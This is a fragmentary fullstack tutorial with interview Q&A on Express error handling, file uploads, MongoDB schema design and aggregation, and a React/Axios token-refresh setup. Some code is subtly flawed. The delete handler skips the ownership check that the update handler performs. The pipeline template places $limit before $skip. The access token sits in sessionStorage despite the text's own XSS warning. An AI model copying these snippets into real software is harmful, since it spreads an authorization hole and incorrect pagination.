What is API versioning and why use /v1/?
Version prefix allows old and new API versions to coexist. When you make breaking changes (rename fields, change response shape), deploy as /v2/ — old clients on /v1/ keep working during migration.
// Without versioning — breaking change breaks ALL clients immediately: GET /users/profile → { fullname: "Tejas" } (old) GET /users/profile → { name: "Tejas" } (new — every client breaks) // With versioning — gradual migration: GET /api/v1/users/profile → { fullname: "Tejas" } (old clients, still works) GET /api/v2/users/profile → { name: "Tejas" } (new clients, new shape) // Deprecate v1 after all clients migrate ✓
What is the two-step file upload pattern and why is it used with Cloudinary?
Multer saves the file locally first (gives you a file path), then you upload from that path to Cloudinary, then delete the local file. Direct streaming from request to Cloudinary requires more complex SDK setup and error handling.
Client → multipart/form-data request → Multer middleware: saves to ./public/temp/1735000000-image.jpg → Controller: uploadToCloudinary("./public/temp/1735000000-image.jpg") → cloudinary.uploader.upload(localPath) // uploads from disk → fs.unlinkSync(localPath) // delete temp file (always!) → Controller: User.create({ avatar: cloudinaryResponse.url }) // If you skip deletion: public/temp grows unboundedly → disk full → crash

  if (video.owner.toString() !== req.user._id.toString())
    throw new ApiError(403, "You can only update your own videos")
  video.title = req.body.title || video.title
  await video.save()
  return res.json(new ApiResponse(200, "Video updated", video))
})

// DELETE
const deleteVideo = asyncHandler(async(req, res) => {
  const video = await Video.findByIdAndDelete(req.params.videoId)
  if (!video) throw new ApiError(404, "Video not found")
  return res.json(new ApiResponse(200, "Video deleted", {}))
})

Global Error Handler

The missing piece of the error chain. Every throw new ApiError() in your project ends up here. Without this, Express sends its own ugly HTML error page.

The Full Error Flow

Controller throws: throw new ApiError(401, "Unauthorized") ↓ asyncHandler catches: .catch(next) → calls next(error) ↓ Express detects error middleware (4 args): (err, req, res, next) ↓ Your global error handler sends the response

Setting Up the Global Error Handler

src/app.js — add AFTER all routes
// Must be AFTER routes — Express identifies error middleware by 4 args
app.use((err, req, res, next) => {
  // Determine status code
  const statusCode = err.code || err.statusCode || 500

  // Handle Mongoose validation errors
  if (err.name === "ValidationError") {
    return res.status(400).json({
      statusCode: 400,
      message: Object.values(err.errors)[0].message,
      success: false
    })
  }

  // Handle Mongoose duplicate key error (unique field)
  if (err.code === 11000) {
    const field = Object.keys(err.keyValue)[0]
    return res.status(409).json({
      statusCode: 409,
      message: `${field} already exists`,
      success: false
    })
  }

  // Handle JWT errors
  if (err.name === "JsonWebTokenError") {
    return res.status(401).json({ statusCode: 401, message: "Invalid token", success: false })
  }
  if (err.name === "TokenExpiredError") {
    return res.status(401).json({ statusCode: 401, message: "Token expired", success: false })
  }

  // ApiError or generic error
  return res.status(statusCode).json({
    statusCode: statusCode,
    message:    err.message || "Something went wrong",
    success:    false,
    // Only show stack trace in development:
    ...(process.env.NODE_ENV === "development" && { stack: err.stack })
  })
})

Database Relationships — Embed vs Reference

MongoDB's most important design decision. Getting this wrong causes either slow queries or data inconsistency. Learn the rules once.

Two Ways to Relate Data

EmbeddingReferencing
HowNest the document inside the parentStore the ObjectId, use populate()
ReadsOne query — data is already thereTwo queries — find parent, then find referenced docs
UpdatesUpdate parent documentUpdate referenced collection independently
Use whenData belongs to one parent, read togetherData is shared, large, or frequently updated independently

Embedding — When to Use

Example: User address — always belongs to this user, always read with user
const userSchema = new Schema({
  username: String,
  address: {           // ← embedded subdocument
    street: String,
    city:   String,
    pin:    String,
  }
})
// Document in DB:
// { username: "tejas", address: { street: "MG Road", city: "Pune" } }
// ONE query to get user + address. Simple. Fast.

Use embedding when: the nested data is only accessed through the parent, won't grow unboundedly, and is always read together with the parent.

Referencing — When to Use

Example: Video owner — User is a separate entity, shared across many videos
const videoSchema = new Schema({
  title: String,
  owner: { type: Schema.Types.ObjectId, ref: "User" }  // ← reference
})

// Get video WITH owner data (populate = second DB query):
await Video.findById(id).populate("owner", "username avatar")
// → { title: "Video", owner: { username: "tejas", avatar: "url" } }

// Don't need owner data? Don't populate. Saves the second query.
await Video.findById(id)   // → { title: "Video", owner: ObjectId("abc123") }

Use referencing when: the data is a separate entity (User, Category), is shared across multiple documents, or is large and not always needed.

The Golden Rules

  • 1:1 or 1:few → Embed (user profile, address, settings)
  • 1:many or many:many → Reference (video owner, post tags, order items)
  • Unbounded arrays → Never embed (comments on a post — MongoDB documents max out at 16MB)
  • Frequently read together → Embed (user + avatar)
  • Updated independently → Reference (user changes username — all videos auto-reflect it via populate)
Interview Q

"When would you embed vs reference in MongoDB?" — Embed when data is owned by one parent and always read together (address, profile). Reference when data is shared, large, or updated independently (user, category). Rule: if the embedded array can grow unboundedly, always reference.

Aggregation Pipeline

MongoDB's most powerful feature. Used for complex queries: joins, filters, groups, sorts in a single DB operation. Used in real-world projects for feeds, analytics, recommendations.

What Is an Aggregation Pipeline?

A sequence of stages — each stage transforms the documents and passes them to the next. Think of it like piping: data | filter | join | group | sort | limit.

Basic pipeline structure
Model.aggregate([
  { $match:   { /* filter documents (like .find()) */ } },
  { $lookup:  { /* join another collection */ } },
  { $unwind:  { /* flatten an array field */ } },
  { $group:   { /* group and aggregate (count, sum, avg) */ } },
  { $project: { /* select/rename/compute fields */ } },
  { $sort:    { /* sort results */ } },
  { $limit:   10 },   // only take 10
  { $skip:    20 },   // skip first 20 (pagination)
])

Key Stages with Examples

$match — filter (always put this first to reduce documents early)
{ $match: { isPublished: true, views: { $gte: 1000 } } }
// Only keep videos that are published AND have 1000+ views
$lookup — JOIN another collection
{ $lookup: {
  from:         "users",          // collection to join (lowercase plural)
  localField:   "owner",         // field in current doc (ObjectId)
  foreignField: "_id",           // field in users collection
  as:           "ownerDetails"   // name for the joined array
}}
// Result: ownerDetails is an ARRAY (even for one user)
// Use $unwind next to flatten it to a single object
$group — count, sum, average
{ $group: {
  _id:        "$owner",          // group by this field
  totalVideos:{ $sum: 1 },       // count documents per group
  totalViews: { $sum: "$views" }, // sum the views field
  avgViews:   { $avg: "$views" }  // average views per user
}}
$project — shape the output
{ $project: {
  title:    1,                         // include
  password: 0,                         // exclude
  fullName: { $concat: ["$firstName", " ", "$lastName"] }  // computed
}}

Real Example: Get User's Channel Profile

Get subscriber count + total videos for a user's channel
const channelStats = await User.aggregate([
  { $match:  { username: username.toLowerCase() } },
  { $lookup: { from: "subscriptions", localField: "_id",
               foreignField: "channel", as: "subscribers" } },
  { $lookup: { from: "videos", localField: "_id",
               foreignField: "owner", as: "videos" } },
  { $addFields: {
    subscriberCount: { $size: "$subscribers" },
    videoCount:      { $size: "$videos" },
    isSubscribed:    { $in: [req.user?._id, "$subscribers.subscriber"] }
  }},
  { $project: { password: 0, refreshToken: 0, subscribers: 0, videos: 0 } }
])
Interview Q

"When would you use aggregation instead of .find()?" — When you need: joins (lookup), computed fields, grouping/counting, or complex multi-stage filtering. Simple lookups use .find() + .populate(). Aggregation is for analytics, feeds, dashboards, and anything needing more than one collection.

"What is $unwind?" — Deconstructs an array field — creates one document per array element. Needed after $lookup because $lookup always returns an array, even for a single matched document.

"What is docker-compose used for?" — Orchestrating multiple containers that need to work together (app + database + cache + message queue). Defines the whole environment in one YAML file so anyone can run docker compose up and get a complete working system.

"What is a volume in Docker?" — Persistent storage outside the container's filesystem. Without volumes, data inside a container is lost when the container stops. Mount a volume to /data/db in MongoDB to keep your database data across restarts.

2 — Axios Instance (The Central API Client)

One Axios instance with your base URL and interceptors. Every API call goes through here — no scattered fetch() calls.

frontend/src/api/axios.js
import axios from "axios"

const api = axios.create({
  baseURL:         "/api/v1",          // works with Vite proxy in dev
  withCredentials: true,              // IMPORTANT: sends cookies on every request
  timeout:         10000
})

// Request interceptor — attach access token from memory
api.interceptors.request.use((config) => {
  const token = sessionStorage.getItem("accessToken")
  if (token) config.headers.Authorization = `Bearer ${token}`
  return config
})

// Response interceptor — auto-refresh token on 401
api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config
    if (error.response?.status === 401 && !original._retry) {
      original._retry = true
      try {
        const { data } = await api.post("/users/refresh-token")
        sessionStorage.setItem("accessToken", data.data.accessToken)
        return api(original)  // retry original request with new token
      } catch {
        sessionStorage.removeItem("accessToken")
        window.location.href = "/login"  // force logout
      }
    }
    return Promise.reject(error)
  }
)

export default api

4 — Auth Context (React)

frontend/src/context/AuthContext.jsx
import { createContext, useContext, useState, useEffect } from "react"
import api from "../api/axios"

const AuthContext = createContext(null)

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)  // true while checking auth

  // On app load: try to refresh to restore session
  useEffect(() => {
    api.post("/users/refresh-token")
      .then(({ data }) => setUser(data.data.user))
      .catch(() => setUser(null))
      .finally(() => setLoading(false))
  }, [])

  const login = async (credentials) => {
    const { data } = await api.post("/users/login", credentials)
    setUser(data.data.user)
    return data
  }

  const logout = async () => {
    await api.post("/users/logout")
    setUser(null)
  }

  return (
    <AuthContext.Provider value={{ user, loading, login, logout }}>
      {!loading && children}
    </AuthContext.Provider>
  )
}

export const useAuth = () => useContext(AuthContext)

Common Fullstack Interview Questions

Interview Q

"How do you handle authentication in a React + Node.js app?" — Store the access token in memory (React Context/state). Store the refresh token in an httpOnly cookie. On app load, call /refresh-token once — if the cookie is valid, the backend returns a fresh access token and the user is logged in automatically. Attach the access token to every request via an Axios interceptor.

"Why not store tokens in localStorage?" — XSS (Cross-Site Scripting) — if any script on your page is compromised, it can read localStorage and steal the token. httpOnly cookies cannot be read by JavaScript at all — even injected scripts.

"What is CORS and why does it happen in a fullstack app?" — Same-Origin Policy: browsers block requests to a different origin (different domain, port, or protocol). React on port 5173 calling Express on port 8000 = cross-origin = blocked. Solutions: (1) Vite proxy in dev, (2) configure CORS on the backend with cors({ origin: "http://localhost:5173", credentials: true }).

"What is withCredentials: true in Axios?" — Tells the browser to include cookies in cross-origin requests. Without it, even if the backend sets a cookie, the browser won't send it on subsequent requests. Required for refresh token cookies to work.

"How do you handle a 401 (expired token) in React?" — Axios response interceptor: if status is 401, call /refresh-token, get a new access token, store it, then retry the original request. If refresh fails, redirect to login. This is transparent to the user — they never see the token expiry.
